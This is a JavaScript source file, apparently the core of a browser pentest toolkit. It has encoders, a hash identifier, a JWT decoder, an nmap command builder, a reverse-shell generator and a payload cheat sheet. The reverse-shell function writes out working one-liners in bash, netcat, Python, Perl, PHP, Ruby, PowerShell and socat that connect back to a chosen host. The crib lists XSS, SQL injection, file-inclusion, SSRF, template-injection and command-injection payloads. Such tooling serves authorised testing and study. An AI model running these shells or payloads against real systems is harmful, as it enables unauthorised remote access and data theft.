/* ============================================================================
   SEALED CORE  —  fieldkit
   Owner: Wraith.  Do not restyle, do not rename, do not "improve" this block.
   It contains zero DOM code on purpose. It only computes strings.

   CONTRACT:  TK.run(tool, act, vals) -> { out: {key: string}, note: string }
   The design layer owns everything visual. This file owns everything true.
   ============================================================================ */
(function (root) {
  'use strict';

  const TK = {};
  const TE = new TextEncoder();
  const TD = new TextDecoder();

  /* ---------- helpers ---------------------------------------------------- */
  function bytesToBin(u8) {
    let s = '';
    for (let i = 0; i < u8.length; i++) s += String.fromCharCode(u8[i]);
    return s;
  }
  function b64e(str) {
    return btoa(bytesToBin(TE.encode(String(str))));
  }
  function b64d(b64) {
    return TD.decode(Uint8Array.from(atob(String(b64).replace(/\s+/g, '')), c => c.charCodeAt(0)));
  }
  function b64urlEnc(str) {
    return b64e(str).replace(/\+/g, '-').replace(/\//g, '_').replace(/=+$/, '');
  }
  function b64urlDec(s) {
    let t = String(s).replace(/-/g, '+').replace(/_/g, '/');
    while (t.length % 4) t += '=';
    return b64d(t);
  }
  function hexFrom(str) {
    return Array.from(TE.encode(String(str))).map(b => b.toString(16).padStart(2, '0')).join('');
  }
  function strFromHex(h) {
    const clean = String(h).replace(/[^0-9a-fA-F]/g, '');
    if (clean.length % 2) throw new Error('hex length must be even');
    const u8 = new Uint8Array(clean.length / 2);
    for (let i = 0; i < u8.length; i++) u8[i] = parseInt(clean.substr(i * 2, 2), 16);
    return TD.decode(u8);
  }
  function rot13(str) {
    return String(str).replace(/[a-zA-Z]/g, c => {
      const b = c <= 'Z' ? 65 : 97;
      return String.fromCharCode(((c.charCodeAt(0) - b + 13) % 26) + b);
    });
  }
  function tsFmt(sec) {
    const d = new Date(sec * 1000);
    const delta = Math.round((Date.now() / 1000) - sec);
    const rel = Math.abs(delta) < 90 ? 'now'
      : delta > 0 ? `${Math.round(delta / 60)}m ago`
      : `in ${Math.round(-delta / 60)}m`;
    return `${d.toISOString().replace('T', ' ').slice(0, 19)}Z  (${rel})`;
  }
  function need(vals, k, label) {
    const v = (vals[k] || '').trim();
    if (!v) throw new Error(`${label || k} is required`);
    return v;
  }

  /* ---------- 1. codec --------------------------------------------------- */
  const CODECS = {
    b64enc:  s => b64e(s),
    b64dec:  s => b64d(s),
    urlenc:  s => encodeURIComponent(s),
    urldec:  s => decodeURIComponent(s.replace(/\+/g, ' ')),
    hexenc:  s => hexFrom(s),
    hexdec:  s => strFromHex(s),
    htmlenc: s => s.replace(/[&<>"']/g, c => ({ '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;', "'": '&#39;' }[c])),
    html_dec: s => s.replace(/&(#x?[0-9a-fA-F]+|\w+);/g, (m, ent) => {
      if (ent[0] === '#') return String.fromCodePoint(ent[1] === 'x' || ent[1] === 'X' ? parseInt(ent.slice(2), 16) : parseInt(ent.slice(1), 10));
      const named = { amp: '&', lt: '<', gt: '>', quot: '"', apos: "'", nbsp: '\u00a0' };
      return named[ent] !== undefined ? named[ent] : m;
    }),
    rot13:   s => rot13(s)
  };

  /* ---------- 2. hash id ------------------------------------------------- */
  // Heuristic, length + shape based. It narrows the field; it never proves.
  const HASH_RULES = [
    { re: /^\$2[abxy]\$\d{2}\$/, name: 'bcrypt', note: '60 chars, slow — hashcat -m 3200' },
    { re: /^\$argon2(id|i|d)\$/, name: 'Argon2', note: 'modern KDF, no fast crack' },
    { re: /^\$y\$/, name: 'yescrypt', note: 'Debian/Ubuntu default — hashcat -m 28900' },
    { re: /^\$6\$/, name: 'sha512crypt', note: 'Linux /etc/shadow — hashcat -m 1800' },
    { re: /^\$5\$/, name: 'sha256crypt', note: 'Linux /etc/shadow — hashcat -m 7400' },
    { re: /^\$1\$/, name: 'md5crypt', note: 'old Linux — hashcat -m 500' },
    { re: /^\$P\$|^\$H\$/, name: 'phpass / WordPress', note: 'hashcat -m 400 for WP' },
    { re: /^\{SSHA\}/i, name: 'LDAP SSHA', note: 'base64 after the prefix, salt appended' },
    { re: /^\{SHA\}/i, name: 'LDAP SHA', note: 'base64 of raw sha1' },
    { re: /^\d{2}\$/, name: 'md5crypt (BSD variant)', note: 'older $apr1 style' }
  ];
  const HEX_RULES = {
    32: ['MD5', 'NTLM', 'LM halves', 'MD4', 'RIPEMD-128', 'MySQL 4.1'],
    40: ['SHA-1', 'MySQL 5', 'RIPEMD-160', 'NTLM (mixed)'],
    56: ['SHA-224', 'SHA3-224'],
    64: ['SHA-256', 'SHA3-256', 'Keccak-256', 'BLAKE2s-256', 'HMAC-SHA256'],
    96: ['SHA-384', 'SHA3-384'],
    128: ['SHA-512', 'Whirlpool', 'SHA3-512', 'BLAKE2b-512']
  };
  function hashId(h) {
    const s = String(h).trim();
    const out = [];
    if (!s) return { names: [], note: '' };
    for (const r of HASH_RULES) {
      if (r.re.test(s)) out.push({ name: r.name, note: r.note });
    }
    if (!out.length && /^[0-9a-fA-F]+$/.test(s)) {
      const cands = HEX_RULES[s.length];
      if (cands) cands.forEach(n => out.push({ name: n, note: `${s.length} hex chars` }));
      else out.push({ name: `unknown (${s.length} hex)`, note: 'no standard match at that length' });
    }
    if (!out.length && /^[./0-9A-Za-z]{13}$/.test(s)) {
      out.push({ name: 'DES crypt (traditional)', note: '13 chars — legacy shadow' });
    }
    if (!out.length) {
      out.push({ name: 'not a recognised hash', note: 'length and shape match nothing common' });
    }
    return { names: out, note: `${out.length} candidate${out.length === 1 ? '' : 's'} by length/shape only — confirm with the source` };
  }

  /* ---------- 3. jwt ----------------------------------------------------- */
  function jwtDecode(tok) {
    const parts = String(tok).trim().split('.');
    if (parts.length < 2) throw new Error('not a JWT — needs 2-3 dot-separated segments');
    const head = JSON.parse(b64urlDec(parts[0]));
    const body = JSON.parse(b64urlDec(parts[1]));
    const lines = [];
    lines.push('HEADER');
    lines.push(JSON.stringify(head, null, 2));
    lines.push('');
    lines.push('PAYLOAD');
    lines.push(JSON.stringify(body, null, 2));
    lines.push('');
    if (body.exp) lines.push(`exp  ${tsFmt(body.exp)}`);
    if (body.iat) lines.push(`iat  ${tsFmt(body.iat)}`);
    if (body.nbf) lines.push(`nbf  ${tsFmt(body.nbf)}`);
    if (!body.exp) lines.push('no exp claim — token never expires on its own');
    lines.push('');
    lines.push(`alg: ${head.alg}   sig: ${parts[2] ? parts[2].length + ' chars' : 'ABSENT (unsigned)'}`);
    lines.push('decoded only. signature NOT verified — this is a read, not a check.');
    return lines.join('\n');
  }

  /* ---------- 4. nmap builder -------------------------------------------- */
  function nmapBuild(v) {
    const target = need(v, 'target', 'target');
    const flags = ['-n'];
    const warns = [];
    const type = v.scantype || 'connect';
    if (type === 'syn') { flags.push('-sS'); warns.push('-sS needs root (raw sockets). On a non-rooted phone it fails — use connect.'); }
    else if (type === 'udp') { flags.push('-sU'); warns.push('-sU needs root and is slow. Narrow the ports.'); }
    else flags.push('-sT');

    if (v.svc) flags.push('-sV');
    if (v.scripts) flags.push('-sC');
    if (v.aggr) { flags.push('-A'); warns.push('-A is loud: -sV -sC -O together. Triage boxes will see you.'); }
    if (v.pn) flags.push('-Pn');
    if (v.noresolve) { /* -n already in */ }
    const timing = v.timing || '4';
    flags.push(`-T${timing}`);
    if (v.ports && v.ports.trim()) flags.push(`-p ${v.ports.trim().replace(/\s+/g, '')}`);
    else if (!v.aggr) flags.push('--top-ports 1000');
    if (v.out) flags.push(`-oN ${v.out.trim()}`);
    flags.push(target);

    const cmd = 'nmap ' + flags.join(' ');
    return { cmd, notes: warns };
  }

  /* ---------- 5. reverse shell ------------------------------------------- */
  function revshell(v) {
    const ip = need(v, 'ip', 'host');
    const port = need(v, 'port', 'port') || '4444';
    const shells = {
      bash: `bash -i >& /dev/tcp/${ip}/${port} 0>&1`,
      bash196: `0<&196;exec 196<>/dev/tcp/${ip}/${port}; sh <&196 >&196 2>&196`,
      nc_mkfifo: `rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc ${ip} ${port} > /tmp/f`,
      nc_e: `nc -e /bin/sh ${ip} ${port}`,
      python3: `python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("${ip}",${port}));[os.dup2(s.fileno(),f) for f in (0,1,2)];subprocess.call(["/bin/sh","-i"])'`,
      perl: `perl -e 'use Socket;$i="${ip}";$p=${port};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");}'`,
      php: `php -r '$s=fsockopen("${ip}",${port});exec("/bin/sh -i <&3 >&3 2>&3");'`,
      ruby: `ruby -rsocket -e'f=TCPSocket.open("${ip}",${port}).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'`,
      powershell: `powershell -nop -c "$c=New-Object Net.Sockets.TCPClient('${ip}',${port});$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$r2=$r+'PS '+(pwd).Path+'> ';$sb=([text.encoding]::ASCII).GetBytes($r2);$s.Write($sb,0,$sb.Length);$s.Flush()};$c.Close()"`,
      socat: `socat TCP:${ip}:${port} EXEC:/bin/sh,pty,stderr,setsid,sigint,sane`
    };
    const keys = Object.keys(shells);
    return {
      list: keys.map(k => ({ lang: k, cmd: shells[k] })),
      // default view: the one that works most places
      cmd: shells[v.shell] || shells.nc_mkfifo,
      listen: `nc -lvnp ${port}`
    };
  }

  /* ---------- 6. ports --------------------------------------------------- */
  const PORTS = [
    [21, 'ftp', 'anonymous login is still a thing'], [22, 'ssh', 'keys only, no password auth'],
    [23, 'telnet', 'cleartext, should be dead'], [25, 'smtp', 'open relay test'],
    [53, 'dns', 'zone transfer: dig axfr'], [80, 'http', 'start here'],
    [110, 'pop3', 'cleartext mail'], [111, 'rpcbind', 'rpcinfo -p'],
    [135, 'msrpc', 'Windows RPC'], [139, 'netbios-ssn', 'enum4linux'],
    [143, 'imap', 'cleartext mail'], [161, 'snmp', 'default "public" community'],
    [389, 'ldap', 'anonymous bind test'], [443, 'https', 'TLS, check cert + versions'],
    [445, 'smb', 'THE Windows port — smbmap/smbclient'], [512, 'rexec', 'legacy, rlogin family'],
    [514, 'rsh/syslog', 'legacy remote shell'], [873, 'rsync', 'often anonymous read'],
    [993, 'imaps', 'TLS mail'], [995, 'pop3s', 'TLS mail'],
    [1433, 'mssql', 'sa: blank?'], [1521, 'oracle', 'TNS listener'],
    [2049, 'nfs', 'showmount -e'], [2375, 'docker', 'UNAUTHENTICATED daemon = root host'],
    [2376, 'docker-tls', 'same, with TLS'], [3000, 'dev server', 'node/grafana'],
    [3306, 'mysql', 'root:root?'], [3389, 'rdp', 'BlueKeep territory'],
    [4444, 'metasploit default', 'listener side'], [5432, 'postgres', 'trust auth?'],
    [5900, 'vnc', 'often no password'], [5985, 'winrm-http', 'evil-winrm'],
    [5986, 'winrm-https', 'evil-winrm'], [6379, 'redis', 'UNAUTH = write files as root'],
    [8080, 'http-alt', 'proxies, tomcat, jenkins'], [8443, 'https-alt', 'admin panels'],
    [9000, 'php-fpm / portainer', 'fastcgi = RCE'], [9200, 'elasticsearch', 'open index = all your data'],
    [11211, 'memcached', 'UDP 11211 = amplification'], [27017, 'mongodb', 'often no auth']
  ];

  /* ---------- 7. payload crib -------------------------------------------- */
  const CRIBS = [
    { k: 'xss', s: '<script>alert(1)</script>' },
    { k: 'xss', s: '"><img src=x onerror=alert(1)>' },
    { k: 'xss', s: "javascript:alert(1)" },
    { k: 'xss', s: '<svg/onload=alert(1)>' },
    { k: 'sqli', s: "' OR '1'='1" },
    { k: 'sqli', s: "' OR 1=1-- -" },
    { k: 'sqli', s: "1' AND SLEEP(5)-- -" },
    { k: 'sqli', s: "' UNION SELECT NULL,NULL-- -" },
    { k: 'lfi', s: '../../../../etc/passwd' },
    { k: 'lfi', s: '....//....//....//etc/passwd' },
    { k: 'lfi', s: 'php://filter/convert.base64-encode/resource=index.php' },
    { k: 'ssrf', s: 'http://127.0.0.1:80/' },
    { k: 'ssrf', s: 'http://169.254.169.254/latest/meta-data/' },
    { k: 'ssrf', s: 'file:///etc/passwd' },
    { k: 'ssti', s: '{{7*7}}' },
    { k: 'ssti', s: '${7*7}' },
    { k: 'ssti', s: '<%= 7*7 %>' },
    { k: 'cmd', s: ';id' },
    { k: 'cmd', s: '$(id)' },
    { k: 'cmd', s: '`id`' },
    { k: 'redirect', s: '//evil.example' },
    { k: 'redirect', s: 'https:evil.example' }
  ];

  /* ---------- dispatcher ------------------------------------------------- */
  TK.run = function (tool, act, vals) {
    vals = vals || {};
    try {
      switch (tool) {
        case 'codec': {
          const fn = CODECS[act];
          if (!fn) throw new Error('unknown action ' + act);
          const input = vals.input || '';
          if (!input.trim()) throw new Error('nothing to convert');
          return { out: { result: fn(input) }, note: `${act} ok — ${input.length} in, ${fn(input).length} out` };
        }
        case 'hashid': {
          const r = hashId(vals.hash);
          return {
            out: { result: r.names.map(n => `${n.name}\n    ${n.note}`).join('\n\n') },
            note: r.note
          };
        }
        case 'jwt': {
          return { out: { result: jwtDecode(vals.token) }, note: 'decoded — signature not verified' };
        }
        case 'nmap': {
          const r = nmapBuild(vals);
          return {
            out: { result: r.cmd },
            note: r.notes.slice(0, 2).join(' ') || 'connect scan — works without root'
          };
        }
        case 'rev': {
          const r = revshell(vals);
          return {
            out: { result: r.cmd, listener: r.listen },
            note: 'listener first, then the payload'
          };
        }
        case 'ports': {
          const q = (vals.q || '').toLowerCase().trim();
          const rows = PORTS.filter(p => !q || String(p[0]).includes(q) || p[1].includes(q) || p[2].includes(q));
          return {
            out: { result: rows.map(p => `${String(p[0]).padEnd(6)}${p[1].padEnd(22)}${p[2]}`).join('\n') || '(nothing matched)' },
            note: `${rows.length} of ${PORTS.length}`
          };
        }
        case 'crib': {
          const q = (vals.q || '').toLowerCase().trim();
          const rows = CRIBS.filter(c => !q || c.k.includes(q) || c.s.toLowerCase().includes(q));
          return {
            out: { result: rows.map(c => `${c.k.padEnd(10)}${c.s}`).join('\n') || '(nothing matched)' },
            note: `${rows.length} payloads — lab targets only`
          };
        }
        default:
          throw new Error('unknown tool ' + tool);
      }
    } catch (e) {
      return { out: {}, note: 'ERR: ' + e.message };
    }
  };

  TK._internals = { b64e, b64d, b64urlDec, hashId, jwtDecode, nmapBuild, revshell, tsFmt };
  root.TK = TK;
})(window);
